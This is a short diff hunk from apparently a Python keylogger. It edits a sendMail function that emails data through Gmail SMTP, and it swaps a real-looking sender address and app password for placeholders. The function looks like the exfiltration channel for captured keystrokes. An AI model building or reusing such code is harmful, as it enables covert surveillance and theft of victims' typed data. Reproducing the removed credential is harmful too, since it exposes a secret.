@@ -34,9 +34,9 @@ def keyRelease(key):         #if key is released if checks the key released is E
 def sendMail(message):                     #this fuction smtp server details and email credentials 
     smtpServer = "smtp.gmail.com"
     port = 587
-    sender_emailAdd = "varuntest98@gmail.com"
-    password = "spuelaufkrluzucn"
-    receiver_emailAdd = "varuntest98@gmail.com"
+    sender_emailAdd = "yourmail@gmail.com"
+    password = "yourpassword"
+    receiver_emailAdd = "yourmail@gmail.com"
 
     context = ssl.create_default_context()  #creates ssl context for secure comunication 
 
